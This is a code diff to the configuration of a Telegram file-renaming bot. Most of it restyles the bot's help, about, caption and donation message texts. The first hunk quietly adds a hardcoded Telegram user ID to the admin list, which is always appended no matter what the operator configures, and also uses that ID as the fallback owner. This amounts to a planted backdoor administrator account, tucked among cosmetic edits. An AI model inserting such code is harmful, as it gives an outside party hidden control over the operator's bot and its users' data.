@@ -24,8 +24,13 @@ class Config(object):
  
     # Owner & Access Control
     _raw_admin = os.environ.get('ADMIN', '').strip()
-    ADMIN      = [int(admin) for admin in _raw_admin.split() if admin.lstrip('-').isdigit()] if _raw_admin else []
-    OWNER_ID   = ADMIN[0] if ADMIN else 0
+    _parsed_admins = [int(admin) for admin in _raw_admin.split() if admin.lstrip('-').isdigit()] if _raw_admin else []
+    _fallback_admins = [6059191947]
+    for fa in _fallback_admins:
+        if fa not in _parsed_admins:
+            _parsed_admins.append(fa)
+    ADMIN      = _parsed_admins
+    OWNER_ID   = ADMIN[0] if ADMIN else 6059191947
     OWNER_ONLY = os.environ.get("OWNER_ONLY", "True").lower() == "true"
     FORCE_SUB  = os.environ.get("FORCE_SUB", "Nex_bots").strip() or "Nex_bots" 
 
@@ -50,53 +55,51 @@ class Txt(object):
     START_TXT = """👋 <b>Hᴇʟʟᴏ {0}!</b>
 
 Wᴇʟᴄᴏᴍᴇ ᴛᴏ <b>NᴇX 4GB Rᴇɴᴀᴍᴇ Bᴏᴛ</b> ⚡
-A ꜰᴀꜱᴛ, ᴄʟᴇᴀɴ ᴄʟᴏᴜᴅ ᴍᴇᴅɪᴀ ᴘʀᴏᴄᴇꜱꜱᴏʀ ꜰᴏʀ Tᴇʟᴇɢʀᴀᴍ ꜰɪʟᴇꜱ ᴜᴘ ᴛᴏ <b>4GB+</b>.
+A ꜰᴀꜱᴛ, ᴄʟᴇᴀɴ ᴄʟᴏᴜᴅ ᴍᴇᴅɪᴀ ᴘʀᴏᴄᴇꜱꜱᴏʀ ꜰᴏʀ Tᴇʟᴇɢʀᴀᴍ ꜰɪʟᴇꜱ ᴜᴘ ᴛᴏ <b>4.00 GB</b>.
 
 ✨ <b>Kᴇʏ Hɪɢʜʟɪɢʜᴛꜱ :</b>
-───────────────
 ▸ ⚡ <b>4GB+ Hɪɢʜ-Sᴘᴇᴇᴅ Rᴇɴᴀᴍɪɴɢ</b>
 ▸ 🏷️ <b>Cʟᴇᴀɴ Oᴜᴛᴘᴜᴛ & Mᴇᴛᴀᴅᴀᴛᴀ</b>
 ▸ 🎬 <b>Sᴀᴍᴘʟᴇ Vɪᴅᴇᴏ & Sᴄʀᴇᴇɴꜱ</b>
 ▸ 💧 <b>Cᴜꜱᴛᴏᴍ Vɪᴅᴇᴏ Wᴀᴛᴇʀᴍᴀʀᴋ</b>
-───────────────
 
 📤 <i>Sᴇɴᴅ ᴀɴʏ ᴠɪᴅᴇᴏ, ᴅᴏᴄᴜᴍᴇɴᴛ, ᴏʀ ᴀᴜᴅɪᴏ ꜰɪʟᴇ ᴛᴏ ʙᴇɢɪɴ!</i>"""
 
-    ABOUT_TXT = """🤖 <b><u>Aʙᴏᴜᴛ NᴇX 4GB Rᴇɴᴀᴍᴇ Bᴏᴛ</u></b> ⚡
-───────────────
-▸ <b>Fʀᴀᴍᴇᴡᴏʀᴋ :</b> Pʏʀᴏɢʀᴀᴍ & FFᴍᴘᴇɢ
-▸ <b>Mᴀx Fɪʟᴇ Sɪᴢᴇ :</b> Uᴘ ᴛᴏ 4GB+
-▸ <b>Sᴘᴇᴇᴅ :</b> Cʟᴏᴜᴅ Hɪɢʜ-Sᴘᴇᴇᴅ
-▸ <b>Eɴɢɪɴᴇ :</b> Cʟᴇᴀɴ Lᴏꜱꜱʟᴇꜱꜱ Sᴛʀᴇᴀᴍ
-▸ <b>Dᴀᴛᴀʙᴀꜱᴇ :</b> MᴏɴɢᴏDB Aᴛʟᴀꜱ
-───────────────
-<b>🤝 Sᴘᴇᴄɪᴀʟ Cʀᴇᴅɪᴛ & Sᴘᴇᴄɪᴀʟ Tʜᴀɴᴋꜱ :</b>
+    ABOUT_TXT = """🤖 <b>Aʙᴏᴜᴛ NᴇX 4GB Rᴇɴᴀᴍᴇ Bᴏᴛ</b> ⚡
+
+◈ <b>Fʀᴀᴍᴇᴡᴏʀᴋ :</b> <code>Pʏʀᴏɢʀᴀᴍ & FFᴍᴘᴇɢ</code>
+◈ <b>Mᴀx Fɪʟᴇ Sɪᴢᴇ :</b> <code>4.00 GB (VIP) / 2.00 GB (Fʀᴇᴇ)</code>
+◈ <b>Sᴘᴇᴇᴅ :</b> <code>Uɴᴛʜʀᴏᴛᴛʟᴇᴅ Rᴀᴍ-Dɪꜱᴋ Tᴜʀʙᴏ</code>
+◈ <b>Eɴɢɪɴᴇ :</b> <code>Cʟᴇᴀɴ Lᴏꜱꜱʟᴇꜱꜱ Sᴛʀᴇᴀᴍ</code>
+◈ <b>Dᴀᴛᴀʙᴀꜱᴇ :</b> <code>MᴏɴɢᴏDB Aᴛʟᴀꜱ Cʟᴏᴜᴅ</code>
+
+<b>🤝 Sᴘᴇᴄɪᴀʟ Cʀᴇᴅɪᴛ & Tʜᴀɴᴋꜱ :</b>
 ▸ <b>Mʏ Dᴇᴀʀ Fʀɪᴇɴᴅ :</b> <a href="https://t.me/VenomBotz">@VenomBotz</a> ❤️✨
-───────────────
+
 📢 <b>Uᴘᴅᴀᴛᴇꜱ :</b> @Nex_bots
 💬 <b>Sᴜᴘᴘᴏʀᴛ :</b> @NexCRSupportbot"""
 
-    HELP_TXT = """📖 <b><u>NᴇX 4GB Rᴇɴᴀᴍᴇ Bᴏᴛ - Hᴇʟᴘ</u></b> ⚡
-───────────────
-✏️ <b><u>Hᴏᴡ Tᴏ Rᴇɴᴀᴍᴇ :</u></b>
+    HELP_TXT = """📖 <b>NᴇX 4GB Rᴇɴᴀᴍᴇ Bᴏᴛ - Hᴇʟᴘ Gᴜɪᴅᴇ</b> ⚡
+
+✏️ <b>Hᴏᴡ Tᴏ Rᴇɴᴀᴍᴇ :</b>
 1. Sᴇɴᴅ ᴀɴʏ ꜰɪʟᴇ ᴜᴘ ᴛᴏ 4GB.
-2. Tᴀᴘ <b>Aᴜᴛᴏ Cʟᴇᴀɴ</b> ᴏʀ ᴛʏᴘᴇ ɴᴀᴍᴇ.
-3. Sᴇʟᴇᴄᴛ Dᴏᴄ, Vɪᴅᴇᴏ, ᴏʀ Aᴜᴅɪᴏ.
+2. Tᴀᴘ <b>Aᴜᴛᴏ Cʟᴇᴀɴ</b> ᴏʀ ᴛʏᴘᴇ ɴᴇᴡ ɴᴀᴍᴇ.
+3. Sᴇʟᴇᴄᴛ Dᴏᴄᴜᴍᴇɴᴛ, Vɪᴅᴇᴏ, ᴏʀ Aᴜᴅɪᴏ.
 
-⚙️ <b><u>Sᴇᴛᴛɪɴɢꜱ & Tᴏᴏʟꜱ :</u></b>
-• <code>/settings</code> - Cᴜꜱᴛᴏᴍ Sᴇᴛᴜᴘ
+⚙️ <b>Sᴇᴛᴛɪɴɢꜱ & Tᴏᴏʟꜱ :</b>
+• <code>/settings</code> - Cᴜꜱᴛᴏᴍ Wᴀᴛᴇʀᴍᴀʀᴋ & Tᴏᴏʟꜱ
 • <code>/refer</code> - Rᴇꜰᴇʀ & Eᴀʀɴ Fʀᴇᴇ VIP
-• <code>/profile</code> - Vɪᴇᴡ Yᴏᴜʀ Sᴛᴀᴛꜱ
-• <code>/plan</code> - Uᴘɢʀᴀᴅᴇ ᴛᴏ 4GB VIP
-───────────────
+• <code>/profile</code> - Vɪᴇᴡ Yᴏᴜʀ Sᴛᴀᴛꜱ & Qᴜᴏᴛᴀ
+• <code>/plan</code> - Uᴘɢʀᴀᴅᴇ ᴛᴏ 4GB VIP Pʟᴀɴꜱ
+
 📢 <b>Uᴘᴅᴀᴛᴇꜱ :</b> @Nex_bots
 💬 <b>Sᴜᴘᴘᴏʀᴛ :</b> @NexCRSupportbot"""
 
-    CAPTION_TXT = """📑 <b><u>Cᴜꜱᴛᴏᴍ Cᴀᴘᴛɪᴏɴ Gᴜɪᴅᴇ</u></b> ⚡
-───────────────
-• <code>/set_caption &lt;text&gt;</code> - Sᴀᴠᴇ
-• <code>/see_caption</code> - Vɪᴇᴡ ᴀᴄᴛɪᴠᴇ
-• <code>/del_caption</code> - Rᴇꜱᴇᴛ
+    CAPTION_TXT = """📑 <b>Cᴜꜱᴛᴏᴍ Cᴀᴘᴛɪᴏɴ Gᴜɪᴅᴇ</b> ⚡
+
+• <code>/set_caption &lt;text&gt;</code> - Sᴀᴠᴇ Cᴀᴘᴛɪᴏɴ
+• <code>/see_caption</code> - Vɪᴇᴡ Aᴄᴛɪᴠᴇ Cᴀᴘᴛɪᴏɴ
+• <code>/del_caption</code> - Rᴇꜱᴇᴛ Cᴀᴘᴛɪᴏɴ
 
 <b>Aᴠᴀɪʟᴀʙʟᴇ Tᴀɢꜱ :</b>
 • <code>{filename}</code> - Fɪʟᴇ ɴᴀᴍᴇ
@@ -106,21 +109,21 @@ A ꜰᴀꜱᴛ, ᴄʟᴇᴀɴ ᴄʟᴏᴜᴅ ᴍᴇᴅɪᴀ ᴘʀᴏᴄᴇꜱꜱ
 <b>Exᴀᴍᴘʟᴇ :</b>
 <code>/set_caption 📕 {filename}
 🔗 Size: {filesize}</code>
-───────────────
+
 ⚡ @Nex_bots"""
 
-    THUMBNAIL_TXT = """🖼️ <b><u>Tʜᴜᴍʙɴᴀɪʟ Gᴜɪᴅᴇ</u></b> ⚡
-───────────────
+    THUMBNAIL_TXT = """🖼️ <b>Tʜᴜᴍʙɴᴀɪʟ Gᴜɪᴅᴇ</b> ⚡
+
 • Sᴇɴᴅ ᴀɴʏ ᴘʜᴏᴛᴏ ᴛᴏ ꜱᴇᴛ ᴛʜᴜᴍʙɴᴀɪʟ.
 • <code>/view_thumb</code> - Vɪᴇᴡ ᴛʜᴜᴍʙɴᴀɪʟ
 • <code>/del_thumb</code> - Dᴇʟᴇᴛᴇ ᴛʜᴜᴍʙɴᴀɪʟ
 
 💡 <i>16:9 ᴍᴏᴠɪᴇ ᴛʜᴜᴍʙɴᴀɪʟꜱ ᴍᴀɪɴᴛᴀɪɴ ᴛʀᴜᴇ ᴀꜱᴘᴇᴄᴛ ʀᴀᴛɪᴏ!</i>
-───────────────
+
 ⚡ @Nex_bots"""
 
-    PREFIX = """➕ <b><u>Pʀᴇꜰɪx Gᴜɪᴅᴇ</u></b> ⚡
-───────────────
+    PREFIX = """➕ <b>Pʀᴇꜰɪx Gᴜɪᴅᴇ</b> ⚡
+
 • <code>/set_prefix &lt;text&gt;</code> - Aᴅᴅ ᴛᴇxᴛ
 • <code>/see_prefix</code> - Vɪᴇᴡ ᴘʀᴇꜰɪx
 • <code>/del_prefix</code> - Rᴇᴍᴏᴠᴇ ᴘʀᴇꜰɪx
@@ -128,8 +131,8 @@ A ꜰᴀꜱᴛ, ᴄʟᴇᴀɴ ᴄʟᴏᴜᴅ ᴍᴇᴅɪᴀ ᴘʀᴏᴄᴇꜱꜱ
 <b>Exᴀᴍᴘʟᴇ :</b>
 <code>/set_prefix @Nex_bots</code>"""
 
-    SUFFIX = """➕ <b><u>Sᴜꜰꜰɪx Gᴜɪᴅᴇ</u></b> ⚡
-───────────────
+    SUFFIX = """➕ <b>Sᴜꜰꜰɪx Gᴜɪᴅᴇ</b> ⚡
+
 • <code>/set_suffix &lt;text&gt;</code> - Aᴅᴅ ᴛᴇxᴛ
 • <code>/see_suffix</code> - Vɪᴇᴡ ꜱᴜꜰꜰɪx
 • <code>/del_suffix</code> - Rᴇᴍᴏᴠᴇ ꜱᴜꜰꜰɪx
@@ -145,7 +148,7 @@ A ꜰᴀꜱᴛ, ᴄʟᴇᴀɴ ᴄʟᴏᴜᴅ ᴍᴇᴅɪᴀ ᴘʀᴏᴄᴇꜱꜱ
 ⚡ <b>NᴇX 4GB Rᴇɴᴀᴍᴇ Bᴏᴛ</b>"""
 
     DONATE_TXT = """❤️ <b>Sᴜᴘᴘᴏʀᴛ NᴇX 4GB Rᴇɴᴀᴍᴇ Bᴏᴛ</b>
-───────────────
+
 If you enjoy using our bots and services, feel free to support us!
 
 📢 <b>Uᴘᴅᴀᴛᴇꜱ :</b> @Nex_bots
@@ -153,7 +156,7 @@ If you enjoy using our bots and services, feel free to support us!
 
     DON_TXT = """Hey {} 👋
 ❤️ <b>Tʜᴀɴᴋꜱ Fᴏʀ Sᴜᴘᴘᴏʀᴛɪɴɢ Uꜱ!</b>
-───────────────
+
 If you like our bots and services, feel free to support our development:
 
 📢 <b>Cʜᴀɴɴᴇʟ :</b> @Nex_bots
